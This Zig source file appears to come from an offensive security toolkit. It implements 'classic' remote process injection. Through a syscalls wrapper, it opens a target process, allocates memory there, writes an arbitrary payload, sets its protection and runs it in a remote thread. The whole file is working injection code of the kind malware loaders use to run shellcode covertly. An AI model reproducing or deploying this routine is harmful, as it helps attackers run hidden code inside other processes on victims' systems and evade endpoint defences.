const std = @import("std");
const windows = std.os.windows;
const Apis = @import("../api.zig").Apis;
const getRemoteProcessHandle = @import("../process.zig").getRemoteProcessHandle;
const Syscalls = @import("../syscall.zig").Syscalls;
const mem = @import("../helper/mem.zig");

pub fn classic(syscalls: Syscalls, payload: []const u8) !void {
    const h_process = try getRemoteProcessHandle(syscalls);
    if (h_process == null) return error.TargetProcessNotFound;
    defer _ = mem.ntClose(syscalls, h_process.?);

    const page_size = 4096;
    const alloc_size = ((payload.len + page_size - 1) / page_size) * page_size;
    const addr_ptr = try mem.ntAllocWriteProtect(syscalls, h_process.?, alloc_size, windows.MEM_COMMIT | windows.MEM_RESERVE, payload);
    defer _ = mem.ntFreePtr(syscalls, addr_ptr);

    const h_thread = try mem.ntCreateRemoteThread(syscalls, h_process.?, addr_ptr);
    defer _ = mem.ntClose(syscalls, h_thread);

    mem.ntWait(syscalls, h_thread);
}